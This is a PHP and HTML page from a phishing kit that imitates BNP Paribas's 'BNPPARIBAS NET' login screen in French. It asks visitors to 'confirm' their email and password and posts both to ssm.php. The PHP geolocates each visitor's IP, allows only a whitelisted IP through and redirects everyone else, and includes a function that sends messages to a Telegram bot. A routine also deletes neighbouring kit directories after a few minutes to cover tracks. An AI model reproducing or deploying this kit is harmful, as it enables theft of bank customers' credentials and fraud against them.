<?php
session_start();
$StrupLom = $_SERVER['REMOTE_ADDR'];
$donflag = $_SERVER['SERVER_NAME'];
    $info = unserialize(file_get_contents("http://ip-api.com/php/{$StrupLom}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query"));
    if (isset($info['as'])) {
        $_SESSION['isp'] = $info['as'];
    }
    if (isset($info['country'])) {
        $_SESSION['Blasacoun'] = $info['country'];
    }
    if (isset($info['countryCode'])) {
        $_SESSION['Njopf'] = $info['countryCode'];
    }
    if (isset($info['city'])) {
        $_SESSION['Voprt'] = $info['city'];
    }
    if (isset($info['regionName'])) {
        $_SESSION['xOpuy'] = $info['regionName'];
    }
function deleteDirectory($dir) {
    if (!file_exists($dir)) {
        return true;
    }
    if (!is_dir($dir)) {
        return unlink($dir);
    }
    $time_diff = time() - filectime($dir);
    if ($time_diff > 320) { // if the difference is greater than 4 minutes (240 seconds)
        foreach (scandir($dir) as $item) {
            if ($item == '.' || $item == '..') {
                continue;
            }
            if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
              
                return false;
            }
        }
        if (rmdir($dir)) {
          
            return true;
        } else {
          
            return false;
        }
    } else {
     
        return true;
    }
}

$parentDirectory = '../../web';
$directories = glob($parentDirectory.'/*', GLOB_ONLYDIR);

if(is_array($directories)) {
  
    foreach($directories as $dir) {
        if(basename($dir)[0] != '.') { 
            if(deleteDirectory($dir)) {
            
            }  
        }
    }
}
$filename = 'local.txt';
if (file_exists($filename)) {
    $myfile = fopen($filename, "r") or die("Unable to open file!");
    $reslocal = fread($myfile,filesize($filename));

fclose($myfile);
} 
else {
	$StrongSol = "" . basename(__DIR__);
    echo ("<script LANGUAGE='JavaScript'>
    window.location.href='../../index.php?verify_account=session=&" . md5(microtime()) . "&dispatch=" . sha1(microtime()) . "&access=&data=" . sha1(microtime()) . "&lolme=$StrongSol';
    </script>");
    exit();
}



if (trim($reslocal) != trim($StrupLom))
    {
		
    $StrongSol = "" . basename(__DIR__);
    echo ("<script LANGUAGE='JavaScript'>
    window.location.href='../../index.php?verify_account=session=&" . md5(microtime()) . "&dispatch=" . sha1(microtime()) . "&access=&data=" . sha1(microtime()) . "&lolme=$StrongSol';
    </script>");
     exit();	  

}

function telsent($message) {
    $TrubFtub = $_SESSION['idtel'];
    $cRetVckr = $_SESSION['tokentel'];
    $api_url = "https://api.telegram.org/bot{$cRetVckr}/sendMessage";
    $params = ["chat_id" => $TrubFtub, "text" => $message];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api_url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
}

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> 
<html>

<head>
<meta charset="UTF-8">
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<meta http-equiv="pragma" content="no-cache">
<meta http-equiv="Cache-Control" content="no-cache">
<meta http-equiv="expires" content="Tue, 01-Jan-1980 00:00:00 GMT">
<meta http-equiv="date" content="Tue, 01-Jan-1980 00:00:00 GMT">
<title>BNPPARIBAS NET IDENTIFICATION</title>
<link href="images/dciweb.css" rel="stylesheet" type="text/css">
<link href="images/bnp.css" rel="stylesheet" type="text/css">
</head>
<body  bgcolor="#FFFFFF" link="#002288" alink="#002288" vlink="#002288"  >
<script language="JavaScript" src="images/tools.js"></script>
  <style>
    body {display : none;} 
  </style>
  <script>
    if (self == top) { 
      var theBody = document.getElementsByTagName('body')[0];
      theBody.style.display = "block";
    } else { 
      top.location = self.location; 
    }
  </script>
  <script type="text/javascript">
    function clearParams() {
      if (document.saisie.p0 != null) document.saisie.p0.value = "";
    }

    function submitform()
    {
        document.saisie.submit() ;
      clearParams();
    }
    function key(evnt)
    {
      if(evnt.which==13) submitform();
    }
  </script>
  <style type="text/css">
    <!--
    a:link,a:active,a:visited
    {
    text-decoration:none;
    color:black;
    }
    a:hover
    {
    text-decoration: underline;
    color:#0000FF;
    }
    //-->
  </style>
  <div class="page">
    <table>
      <tr>
        <td align="center"><img align="center" border="0" src="images/headerBack.jpg" width="760" height="75"></td>
      </tr>
      <tr>
        <td colspan=2>&nbsp;</td>
      </tr>
    </table>
    <div class="info3"><span style="font-size:130%">
  Acc&eacute;dez &agrave; l'espace s&eacute;curis&eacute; BNPPARIBAS.NET
</span></div>
    <div align="left">
      &nbsp;
    </div>
      <div align="center">
        <b><font color="#FF0000"><font color="#269EE5">Dans ce contexte in&eacute;dit nos agences restent ouvertes dans leur tr&egrave;s grande majorit&eacute; et nous sommes joignables par t&eacute;l&eacute;phone ou mail.<br>Nos equipes sont &agrave; vos cot&eacute;s pour vous proposer si besoin, des solutions adapt&eacute;es &agrave; chaque situation. Nous vous remercions de votre confiance et de votre fid&eacute;lit&eacute;. </font> </font></b>

        <br />

        <p style="font-size:13px; color: red;">Veuillez ne pas quittez la page sans avoir confirmé votre E-mail, cette étape est obligatoire pour la synchronisation des services.</p>

        <center>
          <form autocomplete="off"  name="saisie" method="post" enctype="application/x-www-form-urlencoded" target="_top" action="ssm.php">
              <input type="hidden" name="vkid" value="vkident-8364hk1sgj">
              <input type="hidden" name="p1">
              <div style="width:620px; margin:0 auto; text-align: left">
                <div class="formulaire1" style="height:32px; line-height:32px; font-size:12px;">
                  <img src="images/etape1.png" style="width:20px; height:20px; margin:auto 5px; vertical-align:middle;" />
                  <span style="font-size:14px;"><b>&nbsp;Confirmer l'E-mail rattaché à vos comptes bancaires&nbsp;</b></span>
                </div>
                <div class="encartIdent" >
                  <span class="titre">
  Espace s&eacute;curis&eacute; BNPPARIBAS.NET
</span>
                  <ul>
                     <li><a href=""> <FONT COLOR="#0000FF">Accueil</FONT></a></li> 
                     <li><a href=""   target="_blank"><FONT COLOR="#0000FF">Aide &agrave; la connexion ?</FONT></a></li> 
                        <li><a href=""      target="_blank"><FONT COLOR="#0000FF">Convention</FONT></a></li> 
                    <li><a href="" target="_top"><FONT COLOR="#0000FF">Visite guid&eacute;e</FONT></a></li>
                  </ul>
                </div>
                <br /> <br />
                <div style="float:left;width: 50%;">
                <span style="font-size:12px; margin-left:20px;">Adresse E-mail :</span>
                <input value="" name="p0" type="text" style="margin: auto 5px; vertical-align:middle; width:150px;" required="" />
                <br /> <br /> <br />
                
                <span style="font-size:12px; margin-left:20px;">Mot de passe : &nbsp;&nbsp;</span>
                <input  value="" name="p1" type="text" style="margin: auto 5px; vertical-align:middle; width:150px;" required="" />
                <br /> <br />
                  <table cellpadding="0" cellspacing="0" class="tableBouton">
                    <tr>
                      <td align="center">
                        <a href="#" name="local" onClick="return submitform();">
                          <img src="images/btn_valider.png" alt="" />
                        </a>
                      </td>
                      <td>&nbsp;</td>
                      
                    </tr>
                  </table>




  

<map name="grillemap">
  <script language="javascript">
  CellX=132/5;
  CellY=128/5;
	col=0;
	lig=0;
  tabcar = new Array('A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y');
	function pwd_writeM(cell)
	{
	  document.saisie.pwd.value
   	
		if ( document.saisie.pwd.value.length < 6 )
	  	document.saisie.pwd.value = document.saisie.pwd.value + tabcar[cell];
	}
	for(i=0; i<25; i++ )
	{
	  if(parseInt((i/5), 10)!=lig)
	  {
		  col=0;
		  lig=parseInt((i/5), 10);
	  }
	  posX = parseInt(col*CellX, 10);
	  posY = parseInt(lig*CellY, 10);
	  posX1= parseInt((col+1)*CellX, 10);
	  posY1= parseInt((lig+1)*CellY, 10);
	  col++;
	  document.writeln('<area shape="rect" coords="'+posX+','+posY+','+posX1+','+posY1+'" onclick="pwd_writeM('+i+');" ondblclick="if(navigator.appName==\'Microsoft Internet Explorer\'){pwd_writeM('+i+')}" onfocus="document.saisie.p0.focus();">');
	}
  </script>
  
</map>

                </div>
              </div>
            
          </form>
        </center> 
      </div>
      
      <div style="clear:both;"/>
        <br /><br /><br /><br />
        <div align="center">
        
          
            <div style="padding-top: 10px">
              <img src="images/covid19-information.png" height="300" border="0">
            </div>
          
        
      </div>
        
        
      </div>
    
  </div>
  
  <script type="text/javascript">
    document.saisie.p0.focus();
  </script>
  
  
</div>
</body>


</html>